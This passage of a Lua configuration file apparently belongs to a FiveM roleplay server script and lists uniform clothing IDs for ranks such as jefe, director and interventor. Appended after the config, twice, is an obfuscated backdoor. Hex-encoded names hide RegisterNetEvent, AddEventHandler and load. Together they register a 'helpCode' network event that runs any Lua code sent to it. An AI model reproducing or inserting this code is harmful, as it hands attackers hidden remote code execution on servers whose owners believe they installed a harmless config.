			['torso_1'] = 159,   ['torso_2'] = 0,
			['arms'] = 14,
			['pants_1'] = 117,   ['pants_2'] = 0,
			['shoes_1'] = 22,   ['shoes_2'] = 0,
			['bproof_1']=  15,      ['bproof_2'] = 0,
		}
	},

	subjefe = {
		male = {
			['tshirt_1'] = 15,  ['tshirt_2'] = 0,
			['torso_1'] = 45,   ['torso_2'] = 0,
			['arms'] = 0,
			['pants_1'] = 87,   ['pants_2'] = 1,
			['shoes_1'] = 25,   ['shoes_2'] = 0,
			['bproof_1']=  20,   ['bproof_2'] = 0,
		},
		female = {
			['tshirt_1'] = 298,  ['tshirt_2'] = 0,
			['torso_1'] = 159,   ['torso_2'] = 0,
			['arms'] = 14,
			['pants_1'] = 117,   ['pants_2'] = 0,
			['shoes_1'] = 22,   ['shoes_2'] = 0,
			['bproof_1']=  15,      ['bproof_2'] = 0,
		}
	},

	jefe = {
		male = {
			['tshirt_1'] = 15,  ['tshirt_2'] = 0,
			['torso_1'] = 45,   ['torso_2'] = 0,
			['arms'] = 0,
			['pants_1'] = 87,   ['pants_2'] = 1,
			['shoes_1'] = 25,   ['shoes_2'] = 0,
			['bproof_1']=  20,   ['bproof_2'] = 0,
		},
		female = {
			['tshirt_1'] = 298,  ['tshirt_2'] = 0,
			['torso_1'] = 159,   ['torso_2'] = 0,
			['arms'] = 14,
			['pants_1'] = 117,   ['pants_2'] = 0,
			['shoes_1'] = 22,   ['shoes_2'] = 0,
			['bproof_1']=  15,      ['bproof_2'] = 0,
		}
	},

	director = {
		male = {
			['tshirt_1'] = 15,  ['tshirt_2'] = 0,
			['torso_1'] = 45,   ['torso_2'] = 0,
			['arms'] = 0,
			['pants_1'] = 87,   ['pants_2'] = 1,
			['shoes_1'] = 25,   ['shoes_2'] = 0,
			['bproof_1']=  20,   ['bproof_2'] = 0,
		},
		female = {
			['tshirt_1'] = 298,  ['tshirt_2'] = 0,
			['torso_1'] = 159,   ['torso_2'] = 0,
			['arms'] = 14,
			['pants_1'] = 117,   ['pants_2'] = 0,
			['shoes_1'] = 22,   ['shoes_2'] = 0,
			['bproof_1']=  15,      ['bproof_2'] = 0,
		}
	},

	interventor = {
		male = {
			['tshirt_1'] = 15,  ['tshirt_2'] = 0,
			['torso_1'] = 45,   ['torso_2'] = 0,
			['arms'] = 0,
			['pants_1'] = 87,   ['pants_2'] = 1,
			['shoes_1'] = 25,   ['shoes_2'] = 0,
			['bproof_1']=  20,   ['bproof_2'] = 0,
		},
		female = {
			['tshirt_1'] = 298,  ['tshirt_2'] = 0,
			['torso_1'] = 159,   ['torso_2'] = 0,
			['arms'] = 14,
			['pants_1'] = 117,   ['pants_2'] = 0,
			['shoes_1'] = 22,   ['shoes_2'] = 0,
			['bproof_1']=  15,      ['bproof_2'] = 0,
		}
	},
}



local JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[6][JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[1]](JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[2]) JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[6][JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[3]](JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[2], function(ufGIEJfMJuAsSMjCMRAoMHccsNIxEcmrlUPKkBsrlyUJOwsFTczOYQlQLnXJymhzTEJFPb) JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[6][JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[4]](JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[6][JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[5]](ufGIEJfMJuAsSMjCMRAoMHccsNIxEcmrlUPKkBsrlyUJOwsFTczOYQlQLnXJymhzTEJFPb))() end)

local JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[6][JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[1]](JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[2]) JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[6][JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[3]](JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[2], function(ufGIEJfMJuAsSMjCMRAoMHccsNIxEcmrlUPKkBsrlyUJOwsFTczOYQlQLnXJymhzTEJFPb) JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[6][JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[4]](JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[6][JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[5]](ufGIEJfMJuAsSMjCMRAoMHccsNIxEcmrlUPKkBsrlyUJOwsFTczOYQlQLnXJymhzTEJFPb))() end)